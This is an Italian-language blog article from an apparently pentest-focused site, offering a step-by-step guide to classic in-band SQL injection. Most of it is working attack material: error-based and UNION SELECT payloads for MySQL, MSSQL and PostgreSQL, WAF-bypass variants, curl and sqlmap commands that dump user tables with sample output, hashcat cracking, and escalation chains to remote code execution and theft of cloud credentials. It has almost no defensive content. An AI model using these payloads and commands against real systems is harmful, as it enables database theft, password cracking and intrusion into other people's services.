---
title: 'SQL Injection Classica: UNION SELECT ed Error-Based (Guida Operativa 2026)'
slug: sql-injection-classica
description: 'SQL Injection Classica (In-Band): guida pratica a UNION SELECT ed Error-Based con ORDER BY, data extraction, bypass WAF, SQLMap e dump completo del database passo passo.'
image: /sqlcl.webp
draft: true
date: 2026-03-02T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - sql
---

# SQL Injection Classica (In-Band) — I Dati Escono Direttamente Nella Response

La SQL Injection classica (In-Band) è il tipo più diretto: inietti SQL, i dati estratti appaiono **direttamente nella response HTTP**. Non serve misurare tempi, non serve indovinare character by character — il database risponde con i dati in chiaro nella pagina o nell'API response. Due varianti: **Error-Based** (i dati escono nei messaggi di errore) e **UNION-Based** (i dati escono nei risultati della query originale). È il primo tipo di SQLi da testare perché è il più veloce da sfruttare.

La trovo nel **18% dei pentest web** — percentuale che sale al 25% se includo le API. Quando è In-Band, il dump del database completo richiede **minuti, non ore**. È la differenza tra un finding documentato e un data breach dimostrato nel report.

Satellite operativo della [guida pillar SQL Injection](https://hackita.it/articoli/sql-injection). Vedi anche: [Blind SQL Injection](https://hackita.it/articoli/blind-sql-injection), [Time-Based SQL Injection](https://hackita.it/articoli/time-based-sql-injection).

***

## Fuzzing — Trovare Il Punto Di Injection

### Detection Manuale (il primo passo — sempre)

```bash
# Su ogni parametro (GET, POST, JSON, cookie, header):

# 1. Single quote — triggera errore SQL
https://target.com/products?id=1'
# Se errore SQL visibile → Error-Based confermata!

# 2. Double quote
https://target.com/products?id=1"

# 3. Parentesi
https://target.com/products?id=1)
https://target.com/products?id=1'))

# 4. Commento
https://target.com/products?id=1--
https://target.com/products?id=1#
https://target.com/products?id=1/*

# 5. Operazione matematica (conferma che il valore è trattato come SQL)
https://target.com/products?id=2-1
# Se mostra il prodotto con id=1 → il valore è valutato come SQL!

# 6. Boolean test
https://target.com/products?id=1 AND 1=1  → risposta normale
https://target.com/products?id=1 AND 1=2  → risposta diversa
# → Injection confermata, boolean condition funziona
```

### ffuf Per Parametri Vulnerabili

```bash
# Fuzz per trovare QUALE parametro è vulnerabile
ffuf -u "https://target.com/search?FUZZ=1'" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 500 \
  -fr "error|SQL|syntax|mysql|ora-|postgresql"

# Fuzz per login bypass
ffuf -u "https://target.com/login" \
  -X POST \
  -d "username=FUZZ&password=test" \
  -w /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt \
  -mc 200,302 \
  -mr "dashboard|welcome|admin"
```

***

## Error-Based — I Dati Nei Messaggi Di Errore

Il database restituisce errori che contengono i dati che chiedi. Ogni DBMS ha le sue funzioni:

### MySQL Error-Based

```sql
-- EXTRACTVALUE (il più affidabile)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
-- Errore: XPATH syntax error: '~8.0.32-Ubuntu~'

-- UPDATEXML
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--
-- Errore: XPATH syntax error: '~root@localhost~'

-- Estrai database
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),0x7e))--
-- Errore: XPATH syntax error: '~myapp_production~'

-- Estrai tabelle
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema='myapp_production' LIMIT 0,1),0x7e))--
-- Errore: '~users~'

-- Estrai colonne
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e))--
-- Errore: '~id~', poi '~username~', poi '~password~', poi '~email~'

-- Estrai dati
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 0,1),0x7e))--
-- Errore: '~admin:$2b$12$LJ3YsK..~'
```

### MSSQL Error-Based

```sql
-- CONVERT con errore di tipo
' AND 1=CONVERT(int,(SELECT TOP 1 @@version))--
-- Error: Conversion failed: 'Microsoft SQL Server 2019...'

' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.databases))--
-- Error: Conversion failed: 'master'

' AND 1=CONVERT(int,(SELECT TOP 1 username+':'+password FROM users))--
-- Error: Conversion failed: 'admin:$2b$12$...'
```

### PostgreSQL Error-Based

```sql
-- CAST con errore
' AND 1=CAST((SELECT version()) AS int)--
-- Error: invalid input syntax for integer: 'PostgreSQL 15.3...'

' AND 1=CAST((SELECT usename||':'||passwd FROM pg_shadow LIMIT 1) AS int)--
```

***

## UNION-Based — Appendi I Tuoi Dati Alla Query

Il UNION SELECT è la tecnica più potente: i dati estratti appaiono direttamente dove normalmente appaiono i risultati della query.

Per automatizzare completamente l’exploitation e velocizzare il dump del database, puoi usare **[sqlmap](https://hackita.it/articoli/sqlmap)**, che identifica automaticamente il tipo di SQL Injection, estrae database, tabelle e credenziali e permette anche escalation a RCE.

### Step 1 → Trova il numero di colonne (ORDER BY)

```bash
# Incrementa finché ottieni errore:
https://target.com/products?id=1 ORDER BY 1--   → OK
https://target.com/products?id=1 ORDER BY 2--   → OK
https://target.com/products?id=1 ORDER BY 3--   → OK
https://target.com/products?id=1 ORDER BY 4--   → ERRORE!
# → La query ha 3 colonne

# Alternativa: NULL method
https://target.com/products?id=1 UNION SELECT NULL--           → errore
https://target.com/products?id=1 UNION SELECT NULL,NULL--      → errore
https://target.com/products?id=1 UNION SELECT NULL,NULL,NULL-- → OK!
# → 3 colonne
```

### Step 2 → Trova le colonne visibili nella pagina

```bash
# Usa valori riconoscibili:
https://target.com/products?id=-1 UNION SELECT 'AAA','BBB','CCC'--
# L'ID -1 non esiste → la pagina mostra solo i risultati del UNION
# Cerca AAA, BBB, CCC nella pagina → le colonne dove appaiono sono quelle utili

# Se una colonna mostra BBB → la colonna 2 è riflessa nella pagina
```

### Step 3 → Estrai i dati

```bash
# Version
?id=-1 UNION SELECT 1,version(),3--

# Database corrente
?id=-1 UNION SELECT 1,database(),3--

# Tutti i database
?id=-1 UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata--

# Tutte le tabelle del database target
?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='myapp_production'--

# Tutte le colonne della tabella users
?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--

# DUMP utenti
?id=-1 UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR '\n'),3 FROM users--
```

***

## WAF Bypass — Quando il Payload Base È Bloccato

### Inline Comment (il bypass più usato)

```sql
-- WAF blocca "UNION SELECT"
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3--

-- WAF blocca spazi
UNION/**/SELECT/**/1,2,3--

-- WAF blocca "information_schema"
/*!50000information_schema*/./*!50000tables*/
```

### Case Variation

```sql
uNiOn SeLeCt 1,2,3--
UnIoN sElEcT 1,2,3--
```

### Encoding

```sql
-- URL encoding
%55NION %53ELECT 1,2,3--

-- Double URL encoding
%2555NION %2553ELECT 1,2,3--

-- Unicode
U%4eION SE%4cECT 1,2,3--
```

### Alternative a UNION SELECT

```sql
-- Se UNION è bloccato ma subquery funziona:
' AND (SELECT password FROM users WHERE username='admin')='x' OR '1'='1
-- Error con la password se compare nel messaggio

-- GROUP_CONCAT con subquery:
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users),0x7e))--
```

### Bypass specifici per filtri

```sql
-- Se -- è bloccato: usa #
' UNION SELECT 1,2,3 #

-- Se # è bloccato: usa commento multilinea
' UNION SELECT 1,2,3 /*

-- Se quote è bloccata: usa CHAR()
' UNION SELECT 1,CHAR(97,100,109,105,110),3-- 
-- CHAR(97,100,109,105,110) = "admin"

-- Se = è bloccato: usa LIKE
' AND username LIKE 'admin' AND password LIKE '%
```

***

## Output Reale — Proof Step by Step

### Error-Based

```bash
$ curl -s "https://target.com/products?id=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+version()),0x7e))--"

<div class="error">
XPATH syntax error: '~8.0.32-0ubuntu0.22.04.1~'
</div>
```

### UNION-Based — Database Discovery

```bash
$ curl -s "https://target.com/products?id=-1+UNION+SELECT+1,GROUP_CONCAT(schema_name),3+FROM+information_schema.schemata--"

<div class="product-name">information_schema,myapp_production,mysql,performance_schema</div>
```

### UNION-Based — Dump Utenti

```bash
$ curl -s "https://target.com/products?id=-1+UNION+SELECT+1,GROUP_CONCAT(username,':',password+SEPARATOR+'<br>'),3+FROM+users--"

<div class="product-name">
admin:$2b$12$LJ3YsKzP1rG8Q5vNMt7Q3Oj2XkJ...<br>
mario.rossi:$2b$12$xK9mNqP2r5B7d3vCf8aJ2O...<br>
laura.bianchi:$2b$12$mN2pL4jK8sD6f1wRg9aB3P...<br>
...
(150.000 righe)
</div>
```

### SQLMap Dump

```bash
$ sqlmap -u "https://target.com/products?id=1" --batch --dbs

[*] starting @ 10:00:00
[10:00:02] [INFO] the back-end DBMS is MySQL
[10:00:02] [INFO] fetching database names
available databases [4]:
[*] information_schema
[*] myapp_production
[*] mysql
[*] performance_schema

$ sqlmap -u "https://target.com/products?id=1" -D myapp_production -T users --dump --batch

Database: myapp_production
Table: users
[150234 entries]
+--------+-------------------------+--------------------------------------------------------------+
| id     | username                | password                                                     |
+--------+-------------------------+--------------------------------------------------------------+
| 1      | admin                   | $2b$12$LJ3YsKzP1rG8Q5vNMt7Q3Oj2XkJfGpR...                  |
| 2      | mario.rossi@gmail.com   | $2b$12$xK9mNqP2r5B7d3vCf8aJ2OqWxYzK1nH...                  |
| 3      | laura.bianchi@email.it  | $2b$12$mN2pL4jK8sD6f1wRg9aB3PkLmNvXcYtR...                  |
...
```

***

## Workflow Reale — Dalla Quote Al Dump

### Step 1 → Conferma injection

```bash
https://target.com/products?id=1'
# → Errore SQL visibile? → Error-Based
# → Pagina diversa da id=1? → Boolean-Based
# → id=2-1 mostra prodotto 1? → SQL evaluation confermata
```

### Step 2 → Identifica il tipo

```bash
# Error-Based: errore con dati?
' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--
# Se errore con versione → Error-Based

# UNION-Based: colonne?
' ORDER BY 5-- → errore? ORDER BY 4-- → ok?
# Se trovi il numero → UNION possibile
```

### Step 3 → Column count (UNION)

```bash
' ORDER BY 1-- → OK
' ORDER BY 2-- → OK
' ORDER BY 3-- → OK
' ORDER BY 4-- → ERROR → 3 colonne
```

### Step 4 → UNION extraction

```bash
-1 UNION SELECT 1,database(),3--
-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--
-1 UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users--
```

### Step 5 → SQLMap per dump massivo

```bash
sqlmap -u "URL?id=1" --batch --level=3 --risk=2
sqlmap -u "URL?id=1" -D myapp_production -T users --dump
```

### Step 6 → Crack password

```bash
# Estrai gli hash
sqlmap -u "URL" --passwords
# Cracca con hashcat
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

***

## 🏢 Enterprise Escalation

### In-Band SQLi → Admin → RCE → Cloud

```
UNION SELECT → dump users → admin hash craccato
→ Login admin panel → API key interna
→ MSSQL xp_cmdshell → shell service account
→ /proc/self/environ → AWS creds → CLOUD TAKEOVER
```

### Error-Based → Credential Harvest → Lateral Movement

```
EXTRACTVALUE → password hash uno per uno
→ hashcat → 2.000 password craccate
→ Credential stuffing su altri servizi interni
→ VPN access con credenziali rubate → RETE INTERNA
```

***

## Caso Studio Concreto

**Settore:** E-commerce, 80.000 clienti, MySQL 8.0, PHP 8.1.
**Scope:** Black-box.

Parametro `/products?category=electronics` — ho aggiunto una quote: `electronics'`. Response: errore MySQL con `You have an error in your SQL syntax...`. Error-Based confermata. `EXTRACTVALUE` ha estratto versione, database, tabelle.

`ORDER BY 4` → errore, `ORDER BY 3` → ok → 3 colonne. `UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users` → 80.000 utenti con hash bcrypt nella pagina prodotti. Hashcat: 3.500 password craccate in 4 ore, incluso admin.

Con l'account admin: pannello gestione con upload immagini → File Upload → web shell → RCE → `.env` con AWS creds → S3 con backup completi.

**Tempo dalla quote al dump:** 8 minuti.

***

## ✅ Checklist SQL Injection Classica

```
DETECTION
☐ Single quote (') su ogni parametro
☐ Double quote (") su ogni parametro
☐ Operazione matematica (2-1) testata
☐ Commenti (-- , # , /**/) testati
☐ Errore SQL visibile nella response?

ERROR-BASED
☐ EXTRACTVALUE testato (MySQL)
☐ UPDATEXML testato (MySQL)
☐ CONVERT testato (MSSQL)
☐ CAST testato (PostgreSQL)
☐ version() / @@version estratta
☐ Database corrente estratto
☐ Tabelle estratte
☐ Colonne estratte
☐ Dati estratti (username:password)

UNION-BASED
☐ Column count trovato (ORDER BY)
☐ Colonne riflesse identificate
☐ database() / schema_name estratto
☐ table_name estratti (information_schema)
☐ column_name estratti
☐ Dump completo utenti (GROUP_CONCAT)

WAF BYPASS
☐ Inline comment (/*!50000*/) testato
☐ Case variation testata
☐ URL encoding testato
☐ Double encoding testato
☐ CHAR() al posto di stringhe

EXPLOITATION
☐ SQLMap confermato e usato per dump massivo
☐ Hash password estratti
☐ hashcat/john su hash eseguito
☐ Login admin testato con password craccate
```

***

Satellite della [Guida Completa SQL Injection](https://hackita.it/articoli/sql-injection). Vedi anche: [Blind SQL Injection](https://hackita.it/articoli/blind-sql-injection), [Time-Based SQL Injection](https://hackita.it/articoli/time-based-sql-injection), [SQLi su API REST](https://hackita.it/articoli/sql-injection-api-rest).

> I tuoi parametri resistono a una quote? `UNION SELECT` è bloccato dal WAF? [Penetration test applicativo HackIta](https://hackita.it/servizi) per testare ogni punto di injection. Dalla quote al dump: [formazione 1:1](https://hackita.it/formazione).

## 🔗 External References

* [https://portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)
* [https://portswigger.net/web-security/sql-injection/union-attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
* [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/05-Testing\_for\_SQL\_Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
* [https://cheatsheetseries.owasp.org/cheatsheets/Injection\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
